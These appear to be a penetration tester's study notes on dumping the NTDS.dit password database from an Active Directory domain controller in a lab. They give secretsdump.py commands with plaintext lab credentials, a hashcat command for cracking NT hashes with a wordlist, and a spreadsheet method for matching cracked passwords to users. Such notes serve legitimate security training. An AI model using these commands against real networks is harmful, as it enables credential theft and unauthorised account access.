#NTDS #hashcat #secretsdump  
# What is it?

- A database used to store AD data. This includes:

- User information
- Group information
- Security descriptors
- Password hashes

  

We can use secretsdump with the `-just-dc-ntlm`​ tag against the DC to perform this attack  

`secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.95.132`​

- should dump all secrets including NTDS.DIT  

To show only the NTDS.DIT:  

``secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.95.132 `-just-dc-ntlm`​``  

- should dump just NTDS.dit

Only crack nt part of hash not lm (lm:nt is format)

- copy user and full hashes to excel, use Data tab > Text to Columns > delimiter ":". Then can copy nt hash to file to use hashcat on that file

`hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt`​ `--show`​  

- copy username and cracked passwords to a new excel tab
- use =vlookup(B1,Sheet2!A:B,2,false)​ in column C in tab 1
- This will match the hash with its cracked password in excel. Useful for engagements when there are a lot of hashes/cracked passwords
- Focus on user passwords to crack, DC passwords will likely not be cracked